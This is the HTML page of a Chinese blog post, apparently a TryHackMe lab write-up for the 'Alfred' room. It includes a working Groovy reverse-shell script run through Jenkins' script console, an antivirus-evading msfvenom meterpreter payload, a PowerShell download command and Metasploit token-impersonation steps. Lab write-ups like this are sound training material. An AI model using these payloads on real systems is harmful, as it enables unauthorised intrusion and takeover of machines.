@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sugarcrashx.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="利用 Jenkins 获取初始 shell，然后利用 Windows 身份验证令牌提升您的权限。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Alfred">
+<meta property="og:url" content="https://sugarcrashx.github.io/2022/06/02/Alfred/index.html">
+<meta property="og:site_name" content="SugarCrash!">
+<meta property="og:description" content="利用 Jenkins 获取初始 shell，然后利用 Windows 身份验证令牌提升您的权限。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/rRK4s6mLQloxfXU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/AdjDvk51xSilUpr.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/F8mDEHGzlvaIjML.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/FE3kgcoKYvpNMXZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/YdMkmg2uSyT4CXq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/jlGCIDXLwbpHvE5.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/fkLonNJtEjv13u6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/D2BNPm7yGwCEXQA.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/BEyxbo1WQJruhgz.png">
+<meta property="article:published_time" content="2022-06-02T04:54:56.000Z">
+<meta property="article:modified_time" content="2022-06-02T04:56:54.625Z">
+<meta property="article:author" content="Lu1i丶">
+<meta property="article:tag" content="Tryhackme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/05/18/rRK4s6mLQloxfXU.png">
+
+<link rel="canonical" href="https://sugarcrashx.github.io/2022/06/02/Alfred/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Alfred | SugarCrash!</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">SugarCrash!</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习，想找个师傅带带我</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sugarcrashx.github.io/2022/06/02/Alfred/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.PNG">
+      <meta itemprop="name" content="Lu1i丶">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SugarCrash!">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Alfred
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-06-02 12:54:56 / 修改时间：12:56:54" itemprop="dateCreated datePublished" datetime="2022-06-02T12:54:56+08:00">2022-06-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tryhackme/" itemprop="url" rel="index"><span itemprop="name">Tryhackme</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/06/02/Alfred/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/06/02/Alfred/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>利用 Jenkins 获取初始 shell，然后利用 Windows 身份验证令牌提升您的权限。</p>
+<span id="more"></span>
+<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p><img src="https://s2.loli.net/2022/05/18/rRK4s6mLQloxfXU.png" alt="202205181148136.png"></p>
+<h5 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h5><p>admin:admin<br><img src="https://s2.loli.net/2022/05/18/AdjDvk51xSilUpr.png" alt="202205181148137.png"><br>&#x2F;script到执行命令的地方<br><img src="https://s2.loli.net/2022/05/18/F8mDEHGzlvaIjML.png" alt="202205181148138.png"><br>脚本控制台允许我们运行“任意 Groovy 脚本”<br><img src="https://s2.loli.net/2022/05/18/FE3kgcoKYvpNMXZ.png" alt="202205181148139.png"></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Thread.start &#123;  </span><br><span class="line">String host=<span class="string">&quot;10.0.0.1&quot;</span>;  </span><br><span class="line"><span class="type">int</span> port=<span class="number">4242</span>;  </span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;  </span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="切换到meterpreter-shell"><a href="#切换到meterpreter-shell" class="headerlink" title="切换到meterpreter-shell"></a>切换到meterpreter-shell</h4><p>生成一个马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.40.87 LPORT=5556 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+<p>此有效负载生成编码的 x86-64 反向 tcp Meterpreter 有效负载。有效载荷通常经过编码，以确保它们被正确传输，也可以规避反病毒产品。防病毒产品可能无法识别有效负载并且不会将其标记为恶意。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#x27;http://&lt;ip&gt;:8000/shell-name.exe&#x27;,&#x27;shell-name.exe&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/YdMkmg2uSyT4CXq.png" alt="202205181148140.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">起一个监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 10.13.40.87</span><br><span class="line"><span class="built_in">set</span> lport 5556</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">到启动的命令行中启动shell.exe 反弹shell</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/jlGCIDXLwbpHvE5.png" alt="202205181148141.png"></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>我们有了初始访问权限，让我们使用令牌模拟来获得系统访问权限。<br>Windows 使用令牌来确保帐户具有执行特定操作的正确权限。当用户登录或通过身份验证时，帐户令牌会分配给帐户。这通常由 LSASS.exe 完成（将其视为身份验证过程）。<br>此访问令牌包括：</p>
+<ul>
+<li>用户 SID（安全标识符）</li>
+<li>组 SID</li>
+<li>特权<blockquote>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens</a></p>
+</blockquote>
+</li>
+</ul>
+<p>有两种类型的访问令牌：</p>
+<ul>
+<li>主要访问令牌：与登录时生成的用户帐户相关联的令牌</li>
+<li>模拟令牌：这些允许特定进程（或进程中的线程）使用另一个（用户&#x2F;客户端）进程的令牌来访问资源<br>对于模拟令牌，有不同的级别：</li>
+<li>SecurityAnonymous：当前用户&#x2F;客户端不能冒充另一个用户&#x2F;客户端</li>
+<li>SecurityIdentification：当前用户&#x2F;客户端可以获取客户端的身份和权限，但不能冒充客户端</li>
+<li>SecurityImpersonation：当前用户&#x2F;客户端可以在本地系统上模拟客户端的安全上下文</li>
+<li>SecurityDelegation：当前用户&#x2F;客户端可以在远程系统上模拟客户端的安全上下文<br>其中安全上下文是包含用户相关安全信息的数据结构。</li>
+</ul>
+<p>帐户的权限（在创建帐户或从组继承时授予帐户）允许用户执行特定操作。以下是最常被滥用的特权：</p>
+<ul>
+<li>SeImpersonatePrivilege</li>
+<li>SeAssignPrimaryPrivilege</li>
+<li>SeTcbPrivilege</li>
+<li>SeBackupPrivilege</li>
+<li>SeRestorePrivilege</li>
+<li>SeCreateTokenPrivilege</li>
+<li>SeLoadDriverPrivilege</li>
+<li>SeTakeOwnershipPrivilege</li>
+<li>SeDebugPrivilege<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a></p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /priv           查看所有权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/fkLonNJtEjv13u6.png" alt="202205181148142.png"></p>
+<p>可以看到启用了两个权限（SeDebugPrivilege、SeImpersonatePrivilege）。让我们使用允许我们利用此漏洞的隐身模块。输入：_load incognito_加载 metasploit 中的 incognito 模块。请注意，如果前面的命令不起作用，您可能需要使用_use incognito命令。_还要确保你的 metasploit 是最新的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">impersonate_token <span class="string">&quot;BUILTIN\Administrators&quot;</span></span><br><span class="line">ps</span><br><span class="line">migrate 1208</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/D2BNPm7yGwCEXQA.png" alt="202205181148143.png"><br><img src="https://s2.loli.net/2022/05/18/BEyxbo1WQJruhgz.png" alt="202205181148143.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Tryhackme/" rel="tag"># Tryhackme</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/02/Mr-Robot/" rel="prev" title="Mr.Robot">
+      <i class="fa fa-chevron-left"></i> Mr.Robot
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/02/HackPark/" rel="next" title="HackPark">
+      HackPark <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Nmap"><span class="nav-number">1.</span> <span class="nav-text">Nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Jenkins"><span class="nav-number">1.1.</span> <span class="nav-text">Jenkins</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%87%E6%8D%A2%E5%88%B0meterpreter-shell"><span class="nav-number">2.</span> <span class="nav-text">切换到meterpreter-shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lu1i丶"
+      src="/images/1.PNG">
+  <p class="site-author-name" itemprop="name">Lu1i丶</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lu1i丶</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '2IjWrTCGWIUFwAsamIh2ezIu-gzGzoHsz',
+      appKey     : 'EOJr4RJE5lM0E3ryx1vGuAPV',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
